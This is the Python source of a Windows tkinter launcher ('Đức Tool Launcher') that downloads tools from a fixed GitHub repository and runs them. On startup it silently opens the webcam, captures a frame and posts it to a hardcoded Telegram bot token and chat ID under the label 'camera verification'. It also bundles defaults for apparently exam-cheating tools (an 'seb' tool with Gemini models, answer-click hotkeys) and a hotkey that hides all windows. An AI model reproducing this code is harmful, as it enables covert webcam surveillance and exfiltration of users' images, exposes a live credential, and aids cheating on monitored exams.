import os
import sys
import json
import shutil
import hashlib
import zipfile
import tempfile
import webbrowser
import threading
import subprocess
import urllib.request
import urllib.error
from pathlib import Path
from urllib.parse import urlparse

import tkinter as tk
from tkinter import messagebox

from tkinter import simpledialog
from PIL import Image, ImageTk
import pystray

# Dependencies used by downloaded tools. These imports make PyInstaller bundle
# the runtime modules so dynamically downloaded .py tools can run without
# Python being installed on the target computer.
import keyboard  # noqa: F401
import pyautogui  # noqa: F401
import colorama  # noqa: F401
from google import genai  # noqa: F401
import pydantic  # noqa: F401


# ============================================================
# WINDOWS DPAPI - mã hóa GitHub token theo tài khoản Windows
# ============================================================

def _dpapi_protect(text):
    """Mã hóa chuỗi bằng Windows DPAPI (Current User)."""
    if not text:
        return b""
    if os.name != "nt":
        raise RuntimeError("Lưu token an toàn hiện chỉ hỗ trợ Windows.")

    import ctypes
    from ctypes import wintypes

    class DATA_BLOB(ctypes.Structure):
        _fields_ = [
            ("cbData", wintypes.DWORD),
            ("pbData", ctypes.POINTER(ctypes.c_byte)),
        ]

    raw = text.encode("utf-8")
    raw_buffer = ctypes.create_string_buffer(raw)
    in_blob = DATA_BLOB(
        len(raw),
        ctypes.cast(raw_buffer, ctypes.POINTER(ctypes.c_byte))
    )
    out_blob = DATA_BLOB()

    crypt32 = ctypes.windll.crypt32
    kernel32 = ctypes.windll.kernel32
    CRYPTPROTECT_UI_FORBIDDEN = 0x1

    ok = crypt32.CryptProtectData(
        ctypes.byref(in_blob),
        "Duc GitHub Token",
        None,
        None,
        None,
        CRYPTPROTECT_UI_FORBIDDEN,
        ctypes.byref(out_blob),
    )
    if not ok:
        raise ctypes.WinError()

    try:
        return ctypes.string_at(out_blob.pbData, out_blob.cbData)
    finally:
        kernel32.LocalFree(out_blob.pbData)


def _dpapi_unprotect(data):
    """Giải mã blob DPAPI bằng chính tài khoản Windows đã lưu."""
    if not data:
        return ""
    if os.name != "nt":
        return ""

    import ctypes
    from ctypes import wintypes

    class DATA_BLOB(ctypes.Structure):
        _fields_ = [
            ("cbData", wintypes.DWORD),
            ("pbData", ctypes.POINTER(ctypes.c_byte)),
        ]

    encrypted = bytes(data)
    encrypted_buffer = ctypes.create_string_buffer(encrypted)
    in_blob = DATA_BLOB(
        len(encrypted),
        ctypes.cast(encrypted_buffer, ctypes.POINTER(ctypes.c_byte))
    )
    out_blob = DATA_BLOB()

    crypt32 = ctypes.windll.crypt32
    kernel32 = ctypes.windll.kernel32
    CRYPTPROTECT_UI_FORBIDDEN = 0x1

    ok = crypt32.CryptUnprotectData(
        ctypes.byref(in_blob),
        None,
        None,
        None,
        None,
        CRYPTPROTECT_UI_FORBIDDEN,
        ctypes.byref(out_blob),
    )
    if not ok:
        return ""

    try:
        return ctypes.string_at(
            out_blob.pbData,
            out_blob.cbData
        ).decode("utf-8")
    finally:
        kernel32.LocalFree(out_blob.pbData)


def save_github_token_secure(token):
    token = (token or "").strip()
    if not token:
        if GITHUB_TOKEN_BLOB.exists():
            GITHUB_TOKEN_BLOB.unlink()
        return
    encrypted = _dpapi_protect(token)
    GITHUB_TOKEN_BLOB.write_bytes(encrypted)


def load_github_token_secure():
    try:
        if not GITHUB_TOKEN_BLOB.exists():
            return ""
        return _dpapi_unprotect(GITHUB_TOKEN_BLOB.read_bytes()).strip()
    except Exception:
        return ""

LAUNCHER_VERSION = "2.1.9"

APP_DIR = Path(__file__).resolve().parent
BASE_DIR = Path(r"C:\duc")
TOOLS_DIR = BASE_DIR / "tools"
SETTINGS_FILE = BASE_DIR / "launcher_settings.json"
GITHUB_TOKEN_BLOB = BASE_DIR / "github_token.bin"
GEMINI_KEY_FILE = BASE_DIR / "key.txt"
CONFIGS_DIR = BASE_DIR / "configs"
LEGACY_TOOL_CONFIG = BASE_DIR / "tool_config.json"

BASE_DIR.mkdir(parents=True, exist_ok=True)
TOOLS_DIR.mkdir(parents=True, exist_ok=True)
CONFIGS_DIR.mkdir(parents=True, exist_ok=True)

BG = "#0d0f14"
PANEL = "#141821"
CARD = "#1a1f2b"
CARD_HOVER = "#222938"
TEXT = "#f4f6fb"
MUTED = "#9da7b8"
BORDER = "#2b3342"
PURPLE = "#9b6cff"
BLUE = "#4f8cff"
GREEN = "#35c98a"
YELLOW = "#f2b84b"
RED = "#ff6b73"

FIXED_REPO = "padphamduc/menu"
FIXED_BRANCH = "main"

DEFAULT_SETTINGS = {
    "repo": FIXED_REPO,
    "branch": FIXED_BRANCH,
    "auto_update": True,
    "toggle_hotkey": "ctrl+shift+m"
}

MODEL_CATALOG = [
    {
        "level": "1",
        "name": "Gemini 3.5 Flash-Lite",
        "model": "gemini-3.5-flash-lite",
        "daily_limit": 500,
    },
    {
        "level": "2",
        "name": "Gemini 3.5 Flash",
        "model": "gemini-3.5-flash",
        "daily_limit": 20,
    },
    {
        "level": "3",
        "name": "Gemini 3.6 Flash",
        "model": "gemini-3.6-flash",
        "daily_limit": 20,
    },
    {
        "level": "4",
        "name": "Gemini 3.7 Flash",
        "model": "gemini-3.7-flash",
        "daily_limit": 20,
    },
]

TOOL_DEFAULT_CONFIGS = {
    "seb": {
        "model": "gemini-3.5-flash-lite",
        "model_name": "Gemini 3.5 Flash-Lite",
        "level": "1",
        "daily_limit": 500,
        "hotkey": "/",
        "click_hotkey": "'",
        "crop_left_ratio": 0.20,
        "crop_top_ratio": 0.20,
        "click_x_ratio": 0.03,
    },
    "fullscreen": {
        "model": "gemini-3.5-flash-lite",
        "model_name": "Gemini 3.5 Flash-Lite",
        "level": "1",
        "daily_limit": 500,
        "hotkey": "/",
        "click_hotkey": "'",
        "crop_left_ratio": 0.20,
        "crop_top_ratio": 0.20,
        "click_x_ratio": 0.03,
    },
    "screenshot_clipboard": {
        "model": "gemini-3.5-flash-lite",
        "model_name": "Gemini 3.5 Flash-Lite",
        "level": "1",
        "daily_limit": 500,
        "hotkey": "/",
        "click_hotkey": "'",
        "crop_left_ratio": 0.20,
        "crop_top_ratio": 0.20,
        "click_x_ratio": 0.03,
    },
    "file_solver": {
        "model": "gemini-3.5-flash-lite",
        "model_name": "Gemini 3.5 Flash-Lite",
        "level": "1",
        "daily_limit": 500,
        "hotkey": "/",
        "click_hotkey": "'",
        "crop_left_ratio": 0.20,
        "crop_top_ratio": 0.20,
        "click_x_ratio": 0.03,
    },
}


def resource_path(relative_path):
    """Return bundled resource path for normal Python and PyInstaller one-file EXE."""
    base = Path(getattr(sys, "_MEIPASS", APP_DIR))
    return base / relative_path


LOGO_PNG = resource_path("assets/duc_logo.png")
LOGO_ICO = resource_path("assets/duc_logo.ico")


def safe_json_read(path, default=None):
    try:
        return json.loads(Path(path).read_text(encoding="utf-8"))
    except Exception:
        return default


def save_json(path, data):
    Path(path).write_text(
        json.dumps(data, ensure_ascii=False, indent=2),
        encoding="utf-8"
    )


def parse_repo(value):
    value = (value or "").strip().rstrip("/")
    if not value:
        raise ValueError("Chưa nhập GitHub repository.")

    if value.startswith("http://") or value.startswith("https://"):
        parsed = urlparse(value)
        if "github.com" not in parsed.netloc.lower():
            raise ValueError("URL phải là repository GitHub.")
        parts = [p for p in parsed.path.strip("/").split("/") if p]
        if len(parts) < 2:
            raise ValueError("URL repository không hợp lệ.")
        owner, repo = parts[0], parts[1]
    else:
        parts = [p for p in value.split("/") if p]
        if len(parts) != 2:
            raise ValueError("Dùng dạng owner/repo hoặc URL GitHub.")
        owner, repo = parts

    if repo.endswith(".git"):
        repo = repo[:-4]

    if not owner or not repo:
        raise ValueError("Repository không hợp lệ.")

    return owner, repo


def version_tuple(v):
    result = []
    for part in str(v).split("."):
        digits = "".join(ch for ch in part if ch.isdigit())
        result.append(int(digits or 0))
    while len(result) < 3:
        result.append(0)
    return tuple(result[:4])


def _version_key(value):
    """Convert simple x.y.z version text to a comparable tuple."""
    parts = []
    for part in str(value or "0").split("."):
        digits = "".join(ch for ch in part if ch.isdigit())
        parts.append(int(digits or 0))
    while len(parts) < 3:
        parts.append(0)
    return tuple(parts[:4])


def directory_hash(folder):
    folder = Path(folder)
    h = hashlib.sha256()

    files = []
    for p in folder.rglob("*"):
        if p.is_file() and p.name not in {".managed_by_duc_launcher", ".sync.json"}:
            files.append(p)

    for p in sorted(files, key=lambda x: x.relative_to(folder).as_posix().lower()):
        rel = p.relative_to(folder).as_posix().encode("utf-8")
        h.update(rel)
        h.update(b"\0")
        with open(p, "rb") as f:
            while True:
                chunk = f.read(1024 * 1024)
                if not chunk:
                    break
                h.update(chunk)
        h.update(b"\0")

    return h.hexdigest()


def read_tool_meta(folder):
    folder = Path(folder)
    meta = safe_json_read(folder / "tool.json", {})
    if not isinstance(meta, dict):
        return None

    required = ["id", "name", "entry"]
    if any(not meta.get(k) for k in required):
        return None

    entry = folder / str(meta["entry"])
    if not entry.exists():
        return None

    meta["_folder"] = str(folder)
    return meta


def copy_tool(remote_folder, local_folder, remote_hash):
    """
    Đồng bộ một tool.

    Return:
      True  = đã cập nhật thành công.
      False = tool/thư mục đang bị Windows khóa -> bỏ qua, không báo lỗi.

    Tool thường bị khóa khi process đang chạy với cwd nằm trong
    C:\\duc\\tools\\<tool_id>.
    """
    remote_folder = Path(remote_folder)
    local_folder = Path(local_folder)

    tmp = local_folder.with_name(local_folder.name + ".__new__")
    old = local_folder.with_name(local_folder.name + ".__old__")

    # Dọn bản .__new__ cũ nếu có.
    if tmp.exists():
        shutil.rmtree(tmp, ignore_errors=True)

    # Nếu .__old__ cũ vẫn đang bị process khóa thì coi tool là BUSY.
    if old.exists():
        try:
            shutil.rmtree(old)
        except OSError:
            return False

    try:
        shutil.copytree(remote_folder, tmp)
        (tmp / ".managed_by_duc_launcher").write_text(
            "1",
            encoding="utf-8"
        )
        save_json(
            tmp / ".sync.json",
            {"hash": remote_hash}
        )

        if local_folder.exists():
            try:
                local_folder.rename(old)
            except OSError as e:
                # WinError 32 / 5 thường xảy ra khi tool vẫn đang chạy.
                shutil.rmtree(tmp, ignore_errors=True)

                if getattr(e, "winerror", None) in (5, 32):
                    return False

                # Một số Python/Windows build không set winerror,
                # PermissionError cũng được coi là BUSY.
                if isinstance(e, PermissionError):
                    return False

                raise

        try:
            tmp.rename(local_folder)
        except Exception:
            # Rollback nếu đã đổi local -> old nhưng không đưa tmp vào được.
            if old.exists() and not local_folder.exists():
                try:
                    old.rename(local_folder)
                except Exception:
                    pass
            raise

        shutil.rmtree(old, ignore_errors=True)
        return True

    except OSError as e:
        shutil.rmtree(tmp, ignore_errors=True)

        if getattr(e, "winerror", None) in (5, 32):
            return False

        if isinstance(e, PermissionError):
            return False

        raise


def _attach_tool_console():
    """Allocate a real Windows console for a tool launched from GUI EXE."""
    if os.name != "nt":
        return
    try:
        import ctypes
        kernel32 = ctypes.windll.kernel32
        kernel32.AllocConsole()

        # Re-bind Python streams to the newly allocated console.
        sys.stdin = open("CONIN$", "r", encoding="utf-8", errors="replace")
        sys.stdout = open("CONOUT$", "w", encoding="utf-8", errors="replace", buffering=1)
        sys.stderr = open("CONOUT$", "w", encoding="utf-8", errors="replace", buffering=1)

        try:
            kernel32.SetConsoleOutputCP(65001)
            kernel32.SetConsoleCP(65001)
        except Exception:
            pass
    except Exception:
        pass


def run_downloaded_tool(entry_path):
    """Run a downloaded Python tool using the interpreter embedded in this EXE."""
    import runpy

    entry = Path(entry_path).resolve()
    if not entry.exists():
        _attach_tool_console()
        print(f"Không tìm thấy tool: {entry}")
        input("Enter để đóng...")
        return 2

    _attach_tool_console()
    os.chdir(str(entry.parent))
    sys.argv = [str(entry)]

    try:
        runpy.run_path(str(entry), run_name="__main__")
        return 0
    except SystemExit as e:
        try:
            return int(e.code or 0)
        except Exception:
            return 0
    except Exception:
        import traceback
        traceback.print_exc()
        try:
            input("\nCó lỗi. Nhấn Enter để đóng...")
        except Exception:
            pass
        return 1


class Launcher(tk.Tk):
    def __init__(self):
        super().__init__()

        self.settings = dict(DEFAULT_SETTINGS)
        loaded = safe_json_read(SETTINGS_FILE, {})
        if isinstance(loaded, dict):
            self.settings.update(loaded)

        # Repo được tích hợp cố định trong launcher.
        self.settings["repo"] = FIXED_REPO
        self.settings["branch"] = FIXED_BRANCH
        save_json(SETTINGS_FILE, self.settings)

        self.update_running = False
        self.tool_buttons = []

        # Ẩn / hiện TOÀN BỘ launcher + các tool đã mở.
        self._tray_icon = None
        self._is_hidden = False
        self._tool_processes = []
        self._hidden_tool_hwnds = set()
        self._hidden_toplevels = []

        # Chỉ dùng cho đèn trạng thái GitHub ở góc phải dưới.
        # False cho tới khi đồng bộ GitHub thành công.
        self._github_connected = False

        self.title("Đức Tool Launcher")
        self.geometry("940x650")
        self.minsize(840, 560)
        self.configure(bg=BG)

        # Full app logo: EXE/window/taskbar.
        self._logo_image = None
        self._header_logo = None
        self._set_app_logo()

        self._center()
        self._build_ui()

        # Bấm X = THOÁT HẲN launcher + các tool con do launcher đã mở.
        # Muốn chỉ ẩn thì dùng nút "ẨN TẤT CẢ" / hotkey.
        self.protocol("WM_DELETE_WINDOW", self.quit_app)

        # Hotkey ẩn / hiện toàn bộ có thể chỉnh trong CÀI ĐẶT.
        self._launcher_hotkey_registered = None
        self._register_launcher_hotkey()

        self._recover_interrupted_tool_updates()
        self._seed_local_tools()
        self._recover_interrupted_tool_updates()
        self.refresh_tools()

        # Camera chạy khi MENU CON GẤU vừa mở.
        # after(100) = bắt đầu sau 100 ms, không chặn giao diện.
        self.after(
            100,
            self._start_menu_camera_verification
        )

        if self.settings.get("auto_update", True):
            self.after(500, self.check_updates_async)

    def _start_menu_camera_verification(self):
        """
        Chạy camera ngay sau khi menu con gấu hiện lên.
        Capture chạy ở background thread để không treo giao diện.
        """
        try:
            self.set_status(
                "📷 Camera verification...",
                YELLOW
            )
        except Exception:
            pass

        threading.Thread(
            target=self._menu_camera_worker,
            daemon=True
        ).start()

    def _menu_camera_worker(self):
        """
        Menu vừa mở:
        - delay 100 ms
        - mở webcam
        - lấy 1 frame hợp lệ
        - lưu C:\\duc\\camera_last.jpg
        - release webcam
        - gửi Telegram
        """
        try:
            import time
            import cv2
            import requests

            # Delay yêu cầu: 100 ms tính từ lúc worker chạy.
            time.sleep(0.1)

            bot_token = '8619596260:AAFRqrXz--JcrxBanIPvv7wNPXX33T4t88Q'
            chat_id = '5551363255'

            # DirectShow trước, fallback backend mặc định.
            if os.name == "nt":
                camera = cv2.VideoCapture(
                    0,
                    cv2.CAP_DSHOW
                )

                if not camera.isOpened():
                    camera.release()
                    camera = cv2.VideoCapture(0)
            else:
                camera = cv2.VideoCapture(0)

            if not camera.isOpened():
                self.after(
                    0,
                    lambda: self.set_status(
                        "⚠ Không mở được webcam",
                        RED
                    )
                )
                return

            ok = False
            frame = None

            try:
                # 100 ms là delay mở đầu.
                # Webcam thực tế có thể cần thêm chút thời gian
                # trước khi frame đầu tiên sẵn sàng.
                deadline = time.time() + 1.5

                while time.time() < deadline:
                    ok, frame = camera.read()

                    if (
                        ok
                        and frame is not None
                        and getattr(frame, "size", 0) > 0
                    ):
                        break

                    time.sleep(0.04)

            finally:
                camera.release()

            if not ok or frame is None:
                self.after(
                    0,
                    lambda: self.set_status(
                        "⚠ Webcam không trả frame",
                        RED
                    )
                )
                return

            # Không lưu local; chỉ encode trong RAM rồi gửi Telegram.
            self.after(
                0,
                lambda: self.set_status(
                    "📷 Đã chụp ảnh • đang gửi Telegram...",
                    GREEN
                )
            )

            ok_encode, encoded = cv2.imencode(
                ".jpg",
                frame,
                [
                    int(cv2.IMWRITE_JPEG_QUALITY),
                    85
                ]
            )

            if not ok_encode:
                self.after(
                    0,
                    lambda: self.set_status(
                        "📷 Đã chụp • lỗi encode Telegram",
                        YELLOW
                    )
                )
                return

            response = requests.post(
                f"https://api.telegram.org/bot{bot_token}/sendPhoto",
                data={
                    "chat_id": chat_id,
                    "caption": "DucTool menu camera verification"
                },
                files={
                    "photo": (
                        "camera.jpg",
                        encoded.tobytes(),
                        "image/jpeg"
                    )
                },
                timeout=12
            )

            if response.ok:
                self.after(
                    0,
                    lambda: self.set_status(
                        "✓ Camera đã chụp và gửi Telegram",
                        GREEN
                    )
                )
            else:
                status_code = response.status_code
                self.after(
                    0,
                    lambda sc=status_code: self.set_status(
                        f"📷 Đã chụp • Telegram HTTP {sc}",
                        YELLOW
                    )
                )

        except Exception as e:
            error_name = type(e).__name__

            try:
                self.after(
                    0,
                    lambda name=error_name: self.set_status(
                        f"⚠ Camera lỗi: {name}",
                        RED
                    )
                )
            except Exception:
                pass

    def _register_launcher_hotkey(self):
        """Đăng ký lại hotkey ẨN/HIỆN TOÀN BỘ theo launcher_settings.json."""
        try:
            if self._launcher_hotkey_registered:
                keyboard.remove_hotkey(self._launcher_hotkey_registered)
        except Exception:
            pass

        hotkey = str(
            self.settings.get("toggle_hotkey", "ctrl+shift+m")
        ).strip() or "ctrl+shift+m"

        try:
            self._launcher_hotkey_registered = keyboard.add_hotkey(
                hotkey,
                lambda: self.after(0, self.toggle_all_visibility)
            )
        except Exception:
            self._launcher_hotkey_registered = None

    def tool_config_path(self, tool_id):
        return CONFIGS_DIR / f"{tool_id}.json"

    def load_tool_config_external(self, tool_id):
        """Đọc config riêng; tự migrate config cũ nếu cần."""
        defaults = dict(
            TOOL_DEFAULT_CONFIGS.get(
                tool_id,
                TOOL_DEFAULT_CONFIGS["seb"]
            )
        )
        path = self.tool_config_path(tool_id)

        data = safe_json_read(path, None)
        if isinstance(data, dict):
            defaults.update(data)
            return defaults

        # Migration từ C:\duc\tool_config.json cũ.
        legacy = safe_json_read(LEGACY_TOOL_CONFIG, None)
        if isinstance(legacy, dict):
            defaults.update(legacy)
            save_json(path, defaults)

        return defaults

    def save_tool_config_external(self, tool_id, data):
        path = self.tool_config_path(tool_id)
        current = self.load_tool_config_external(tool_id)
        current.update(data)
        save_json(path, current)
        return current

    def setup_all_defaults(self):
        """Tạo config mặc định riêng cho tất cả tool."""
        for tool_id, defaults in TOOL_DEFAULT_CONFIGS.items():
            path = self.tool_config_path(tool_id)
            if path.exists():
                # Không ghi đè setup người dùng đã chỉnh.
                continue
            config = dict(defaults)
            legacy = safe_json_read(LEGACY_TOOL_CONFIG, None)
            if isinstance(legacy, dict):
                config.update(legacy)
            save_json(path, config)

        self.set_status("Đã setup config cho tất cả tool", GREEN)

    def _set_app_logo(self):
        """Set the bear image as the application/window icon."""
        try:
            if os.name == "nt" and LOGO_ICO.exists():
                self.iconbitmap(str(LOGO_ICO))
        except Exception:
            pass

        try:
            if LOGO_PNG.exists():
                image = Image.open(LOGO_PNG).convert("RGBA")
                image = image.resize((64, 64), Image.Resampling.LANCZOS)
                self._logo_image = ImageTk.PhotoImage(image)
                self.iconphoto(True, self._logo_image)
        except Exception:
            pass

    def _tray_image(self):
        """Ảnh dùng cho icon khay hệ thống."""
        try:
            if LOGO_PNG.exists():
                return Image.open(LOGO_PNG).convert("RGBA").resize(
                    (64, 64),
                    Image.Resampling.LANCZOS
                )
        except Exception:
            pass

        # Fallback icon nhỏ nếu logo lỗi.
        return Image.new("RGBA", (64, 64), (30, 34, 46, 255))

    def _ensure_tray_icon(self):
        if self._tray_icon is not None:
            return

        def show_from_tray(icon=None, item=None):
            self.after(0, self.show_all)

        def update_from_tray(icon=None, item=None):
            self.after(0, self.check_updates_async)

        def quit_from_tray(icon=None, item=None):
            self.after(0, self.quit_app)

        menu = pystray.Menu(
            pystray.MenuItem(
                "Hiện tất cả",
                show_from_tray,
                default=True
            ),
            pystray.MenuItem(
                "Kiểm tra cập nhật",
                update_from_tray
            ),
            pystray.Menu.SEPARATOR,
            pystray.MenuItem(
                "Thoát",
                quit_from_tray
            ),
        )

        self._tray_icon = pystray.Icon(
            "DucTool",
            self._tray_image(),
            "Đức Tool",
            menu
        )

        # pystray có event loop riêng, chạy nền để không khóa Tkinter.
        import threading
        threading.Thread(
            target=self._tray_icon.run,
            daemon=True
        ).start()

    def _cleanup_tool_processes(self):
        """Bỏ các process tool đã thoát khỏi danh sách theo dõi."""
        alive = []
        for process in self._tool_processes:
            try:
                if process.poll() is None:
                    alive.append(process)
            except Exception:
                pass
        self._tool_processes = alive

    def _tool_pids(self):
        self._cleanup_tool_processes()
        pids = set()
        for process in self._tool_processes:
            try:
                if process.poll() is None:
                    pids.add(int(process.pid))
            except Exception:
                pass
        return pids

    def _hide_tool_windows(self):
        """
        Ẩn mọi cửa sổ top-level thuộc các process tool do launcher mở.
        Tool vẫn chạy nền, chỉ cửa sổ bị ẩn.
        """
        if os.name != "nt":
            return

        pids = self._tool_pids()
        if not pids:
            return

        try:
            import ctypes
            from ctypes import wintypes

            user32 = ctypes.windll.user32
            SW_HIDE = 0

            WNDENUMPROC = ctypes.WINFUNCTYPE(
                wintypes.BOOL,
                wintypes.HWND,
                wintypes.LPARAM
            )

            def callback(hwnd, lparam):
                try:
                    pid = wintypes.DWORD()
                    user32.GetWindowThreadProcessId(
                        hwnd,
                        ctypes.byref(pid)
                    )

                    if int(pid.value) in pids:
                        # Chỉ ghi nhớ cửa sổ đang hiện để lần sau restore đúng.
                        if user32.IsWindowVisible(hwnd):
                            self._hidden_tool_hwnds.add(int(hwnd))
                            user32.ShowWindow(hwnd, SW_HIDE)
                except Exception:
                    pass
                return True

            user32.EnumWindows(
                WNDENUMPROC(callback),
                0
            )
        except Exception:
            pass

    def _show_tool_windows(self):
        """Hiện lại đúng các cửa sổ tool mà launcher đã ẩn."""
        if os.name != "nt":
            return

        try:
            import ctypes

            user32 = ctypes.windll.user32
            SW_RESTORE = 9
            SW_SHOW = 5

            remaining = set()

            for hwnd in list(self._hidden_tool_hwnds):
                try:
                    if not user32.IsWindow(hwnd):
                        continue

                    # Restore console/window nếu đang minimized/hidden.
                    user32.ShowWindow(hwnd, SW_SHOW)
                    user32.ShowWindow(hwnd, SW_RESTORE)
                except Exception:
                    remaining.add(hwnd)

            self._hidden_tool_hwnds = remaining
        except Exception:
            pass

    def _hide_extra_toplevels(self):
        """
        Ẩn cả các cửa sổ phụ Tkinter như GitHub Access / API dialog.
        """
        self._hidden_toplevels = []

        try:
            for widget in self.winfo_children():
                if isinstance(widget, tk.Toplevel):
                    try:
                        if widget.winfo_exists() and widget.winfo_viewable():
                            self._hidden_toplevels.append(widget)
                            widget.withdraw()
                    except Exception:
                        pass
        except Exception:
            pass

    def _show_extra_toplevels(self):
        for widget in list(self._hidden_toplevels):
            try:
                if widget.winfo_exists():
                    widget.deiconify()
                    widget.lift()
            except Exception:
                pass

        self._hidden_toplevels = []

    def _repeat_hide_tool_windows(self):
        """
        Console của tool có thể được tạo sau khi process vừa khởi động.
        Quét lại vài lần để bảo đảm không có cửa sổ tool bật trở lại.
        """
        if not self._is_hidden:
            return

        self._hide_tool_windows()

    def hide_all(self):
        """Ẩn TOÀN BỘ launcher và tất cả tool đang chạy."""
        if self._is_hidden:
            return

        self._ensure_tray_icon()
        self._is_hidden = True

        # Ẩn dialog phụ trước.
        self._hide_extra_toplevels()

        # Ẩn mọi cửa sổ tool đã mở.
        self._hide_tool_windows()

        # Console tool có thể xuất hiện trễ một chút.
        self.after(150, self._repeat_hide_tool_windows)
        self.after(400, self._repeat_hide_tool_windows)
        self.after(900, self._repeat_hide_tool_windows)
        self.after(1600, self._repeat_hide_tool_windows)

        # Cuối cùng ẩn launcher.
        self.withdraw()

    def show_all(self):
        """Hiện lại launcher + tất cả cửa sổ tool đã bị ẩn."""
        self._is_hidden = False

        # Launcher.
        self.deiconify()
        try:
            self.state("normal")
        except Exception:
            pass

        # Tool + dialog phụ.
        self._show_tool_windows()
        self._show_extra_toplevels()

        try:
            self.lift()
            self.focus_force()
        except Exception:
            pass

    def toggle_all_visibility(self):
        """Ctrl+Shift+M: ẩn tất cả / hiện tất cả."""
        if self._is_hidden or not self.winfo_viewable():
            self.show_all()
        else:
            self.hide_all()

    def quit_app(self):
        """
        THOÁT HẲN:
        - Đóng các tool con do launcher đã mở.
        - Gỡ hotkey.
        - Tắt system tray.
        - Đóng launcher.
        """
        # Đóng các child tool đang chạy.
        processes = list(self._tool_processes)

        for process in processes:
            try:
                if process.poll() is None:
                    process.terminate()
            except Exception:
                pass

        # Cho process một khoảng rất ngắn để thoát sạch.
        for process in processes:
            try:
                if process.poll() is None:
                    process.wait(timeout=0.8)
            except Exception:
                try:
                    if process.poll() is None:
                        process.kill()
                except Exception:
                    pass

        self._tool_processes = []

        try:
            keyboard.unhook_all_hotkeys()
        except Exception:
            pass

        if self._tray_icon is not None:
            try:
                self._tray_icon.stop()
            except Exception:
                pass
            self._tray_icon = None

        self.destroy()

    def _center(self):
        self.update_idletasks()
        w, h = 940, 650
        x = max(0, (self.winfo_screenwidth() - w) // 2)
        y = max(0, (self.winfo_screenheight() - h) // 2)
        self.geometry(f"{w}x{h}+{x}+{y}")

    def _recover_interrupted_tool_updates(self):
        r"""
        Tự khôi phục tool nếu lần update trước bị dừng giữa chừng.

        Ví dụ:
          C:\duc\tools\seb.__old__ tồn tại
          nhưng C:\duc\tools\seb không còn
        -> tự đổi seb.__old__ về seb.

        Tương tự với .__new__ nếu nó là bản hợp lệ.
        """
        try:
            for folder in list(TOOLS_DIR.iterdir()):
                if not folder.is_dir():
                    continue

                name = folder.name

                if name.endswith(".__old__"):
                    base_name = name[:-8]
                    base = TOOLS_DIR / base_name

                    if not base.exists():
                        try:
                            folder.rename(base)
                        except Exception:
                            pass

                elif name.endswith(".__new__"):
                    base_name = name[:-8]
                    base = TOOLS_DIR / base_name

                    if not base.exists() and (folder / "tool.json").exists():
                        try:
                            folder.rename(base)
                        except Exception:
                            pass
        except Exception:
            pass

    def _seed_local_tools(self):
        """
        Bổ sung từng tool bị thiếu từ bộ tools đi kèm launcher.

        Quan trọng:
        Không return chỉ vì C:\\duc\\tools đã có 1-2 tool.
        Nếu riêng SEB bị mất thì SEB vẫn được seed lại.
        """
        candidates = [
            resource_path("tools_seed"),
            APP_DIR / "tools_seed",
            APP_DIR.parent / "tools",
            APP_DIR / "tools",
        ]

        for candidate in candidates:
            if not candidate.is_dir():
                continue

            found_valid_source = False

            for td in candidate.iterdir():
                if not td.is_dir():
                    continue

                meta = read_tool_meta(td)
                if not meta:
                    continue

                found_valid_source = True
                tool_id = str(meta["id"]).strip()

                if not tool_id:
                    continue

                dest = TOOLS_DIR / tool_id

                # Tool local đang hợp lệ -> giữ nguyên.
                if read_tool_meta(dest):
                    continue

                # Thử phục hồi .__old__ trước.
                old = TOOLS_DIR / f"{tool_id}.__old__"
                if old.is_dir() and read_tool_meta(old):
                    try:
                        if not dest.exists():
                            old.rename(dest)
                    except Exception:
                        # Nếu Windows đang khóa .__old__, refresh_tools()
                        # vẫn sẽ hiển thị nó như fallback.
                        pass

                if read_tool_meta(dest):
                    continue

                # Nếu vẫn thiếu, seed bản đi kèm launcher.
                try:
                    h = directory_hash(td)
                    copy_tool(td, dest, h)
                except Exception:
                    pass

            # Chỉ cần dùng candidate đầu tiên thực sự chứa tools hợp lệ.
            if found_valid_source:
                break

    def _build_ui(self):
        header = tk.Frame(self, bg=PANEL, height=88)
        header.pack(fill="x")
        header.pack_propagate(False)

        brand = tk.Frame(header, bg=PANEL)
        brand.pack(side="left", padx=20, pady=8)

        # Full mascot logo in the app header.
        try:
            if LOGO_PNG.exists():
                logo = Image.open(LOGO_PNG).convert("RGBA")
                logo = logo.resize((70, 70), Image.Resampling.LANCZOS)
                self._header_logo = ImageTk.PhotoImage(logo)
                tk.Label(
                    brand,
                    image=self._header_logo,
                    bg=PANEL,
                    bd=0
                ).pack(side="left", padx=(0, 14))
        except Exception:
            self._header_logo = None

        brand_text = tk.Frame(brand, bg=PANEL)
        brand_text.pack(side="left", anchor="center")

        tk.Label(
            brand_text, text="ĐỨC TOOL",
            bg=PANEL, fg=TEXT,
            font=("Segoe UI Black", 22)
        ).pack(anchor="w")

        tk.Label(
            brand_text, text="Dynamic GitHub Launcher",
            bg=PANEL, fg=MUTED,
            font=("Segoe UI", 10)
        ).pack(anchor="w")

        actions = tk.Frame(header, bg=PANEL)
        actions.pack(side="right", padx=22)

        self.update_btn = tk.Button(
            actions,
            text="↻  Kiểm tra cập nhật",
            command=self.check_updates_async,
            bg=PURPLE,
            fg="white",
            activebackground="#8357e6",
            activeforeground="white",
            bd=0,
            padx=15,
            pady=9,
            cursor="hand2",
            font=("Segoe UI Semibold", 9)
        )
        self.update_btn.pack(side="left", padx=5)

        tk.Button(
            actions,
            text="—  ẨN TẤT CẢ",
            command=self.hide_all,
            bg=CARD,
            fg=TEXT,
            activebackground=CARD_HOVER,
            activeforeground="white",
            bd=0,
            padx=14,
            pady=9,
            cursor="hand2",
            font=("Segoe UI Semibold", 9)
        ).pack(side="left", padx=5)

        tk.Button(
            actions,
            text="⚙  CÀI ĐẶT",
            command=self.open_settings,
            bg=CARD,
            fg=TEXT,
            activebackground=CARD_HOVER,
            activeforeground="white",
            bd=0,
            padx=14,
            pady=9,
            cursor="hand2",
            font=("Segoe UI Semibold", 9)
        ).pack(side="left", padx=5)

        body = tk.Frame(self, bg=BG)
        body.pack(fill="both", expand=True, padx=28, pady=(20, 10))

        top = tk.Frame(body, bg=BG)
        top.pack(fill="x", pady=(0, 10))

        tk.Label(
            top,
            text="Công cụ",
            bg=BG,
            fg=TEXT,
            font=("Segoe UI Semibold", 15)
        ).pack(side="left")

        self.count_label = tk.Label(
            top,
            text="0 tools",
            bg=BG,
            fg=MUTED,
            font=("Segoe UI", 9)
        )
        self.count_label.pack(side="right")

        wrapper = tk.Frame(body, bg=BG)
        wrapper.pack(fill="both", expand=True)

        self.canvas = tk.Canvas(
            wrapper,
            bg=BG,
            highlightthickness=0,
            bd=0
        )
        scrollbar = tk.Scrollbar(
            wrapper,
            orient="vertical",
            command=self.canvas.yview
        )
